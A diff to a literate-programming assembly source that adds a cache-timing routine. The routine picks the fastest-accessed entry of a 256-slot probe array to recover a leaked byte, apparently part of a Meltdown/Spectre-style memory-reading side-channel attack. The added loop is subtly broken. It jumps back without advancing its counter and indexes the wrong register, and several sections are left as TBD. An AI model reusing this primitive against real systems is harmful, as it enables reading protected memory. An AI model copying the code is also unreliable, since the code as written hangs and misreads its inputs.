@@ -477,7 +477,6 @@ for each page.
 
 <<detect-cache-area-time>>=
 _calcareacachetime:
-     cld
      xor       RCX,RCX
 .next_timing:
      push      RCX
@@ -490,6 +489,52 @@ _calcareacachetime:
      jb        .next_timing
      ret
 @ %def _calcareacachetime
+
+We now can determine the cache line with the lowest access time. This is the cache line that was cached before.
+
+\paragraph{Parameters}
+\begin{labeling}{[XXX-XXX]}
+\item [RDI] the address of the probe array
+\item [RSI] the interval between the probe addresses used
+\item [RDX] the address of the results of the cache measurements. The area needs to be 256~*~8~bytes in size
+\end{labeling}
+
+\paragraph{Return}
+\begin{labeling}{[XXX-XXX]}
+\item [RAX] the byte (in \verb|AL|) which is found by cache timing analysis
+\end{labeling}
+
+TBD
+
+<<detect-byte>>=
+_detectbytebycl:
+     push      RDI
+     call      _calcareacachetime
+     pop       RDI
+     mov       RSI,RDX
+     xor       RCX,RCX
+     mov       R8,0xffffffffffffffff
+     xor       R9,R9
+.nextbyte:
+     mov       RAX,[RDI+8*RCX]
+     cmp       RAX,R8
+     ja        .nextbyte
+     mov       R8,RAX
+     mov       R9,RCX
+     inc       RCX
+     cmp       RCX,256
+     jb        .nextbyte
+     mov       RAX,R9
+     ret
+@
+
+Now we need some area to store all the data. Once we use an area for the timing data and another area for the read
+memory data.
+
+<<cacheread-udata>>=
+     result:        resb pagesize
+     timing:        resq 256
+@
 
 TBD
 
@@ -511,6 +556,8 @@ section .text
 <<calculate-cache-access-time>>
 
 <<detect-cache-area-time>>
+
+<<detect-byte>>
 
 <<xorshift-prng>>
 
